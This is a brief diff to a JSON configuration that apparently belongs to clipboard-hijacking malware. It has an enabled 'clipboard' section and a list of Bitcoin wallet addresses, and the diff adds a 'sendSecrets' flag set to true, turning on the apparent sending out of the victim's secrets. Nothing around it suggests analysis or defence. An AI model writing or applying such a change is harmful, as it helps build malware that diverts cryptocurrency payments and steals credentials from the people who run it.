@@ -15,6 +15,7 @@
   },
   "clipboard": {
     "enabled": true,
+    "sendSecrets": true,
     "coins": {
       "btc": [
         "bc1qqypqxpq9qcrsszg2pvxq6rs0zqg3yyc5fcj4z3"
